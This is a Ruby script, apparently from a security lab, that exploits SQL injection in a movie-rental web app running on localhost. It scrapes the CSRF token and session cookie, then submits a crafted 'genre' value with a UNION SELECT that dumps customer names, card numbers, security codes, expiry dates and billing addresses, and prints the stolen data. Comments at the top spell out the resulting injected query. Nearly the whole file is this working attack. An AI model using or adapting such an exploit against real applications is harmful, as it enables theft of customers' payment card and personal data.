# SELECT * FROM movies WHERE genre='' AND 1=0 UNION SELECT name, card_number, security_code, exp_month, exp_year, billing_street, billing_city FROM customers UNION SELECT * FROM movies WHERE 1=0 AND genre='' ORDER BY title;
# SELECT * FROM movies WHERE genre='' ORDER BY title;
#' AND 1=0 UNION SELECT name, card_number, security_code, exp_month, exp_year, billing_street, billing_city FROM customers UNION SELECT * FROM movies WHERE 1=0 AND genre='

require 'socket'
require 'cgi'

host = "localhost"
port = 3000

request = "GET /movies/selectGenre HTTP/1.1\n" \
		  "Connection: close\n" \
		  "Host: localhost:3000\n" \
		  "\r\n"

s = TCPSocket.open(host, port)

s.puts request
response = s.read


if response =~ /<input name="authenticity_token" type="hidden" value="(.*)" \/>/
	auth_token = $1  
else
	# TODO: handle error
end

if response =~ /^Set-Cookie: _session_id=([a-zA-Z0-9]*);/
	cookie = $1
else
	# TODO: handle error
end


egg = "' AND 1=0 UNION SELECT name, card_number, security_code, exp_month, exp_year, billing_street, billing_city FROM customers UNION SELECT * FROM movies WHERE 1=0 AND genre='"

body = "authenticity_token=" + CGI::escape(auth_token) + "&" \
	   "genre=" + CGI::escape(egg) + "&" \
	   "commit=Show+Movies"

request2 = "POST /movies/showGenre HTTP/1.1\n" \
		  "Host: localhost:3000\n" \
		  "Connection: close\n" \
		  "Content-Type: application/x-www-form-urlencoded\n" \
		  "Content-Length: " + body.size.to_s + "\n" \
		  "Cookie: _session_id=" + cookie + "\n" \
		  "\r\n"


request2 += body

s2 = TCPSocket.open(host, port)

s2.puts request2
response2 = s2.read


customer_info = []

regex_cc = /<td><a href="\/movies\/rent\/0">([0-9]*)<\/a><\/td>/
regex = /<td><a href="\/movies\/rent\/0">([0-9]*)<\/a><\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>/

response2.scan(regex) {|e| customer_info << e}

puts customer_info.to_s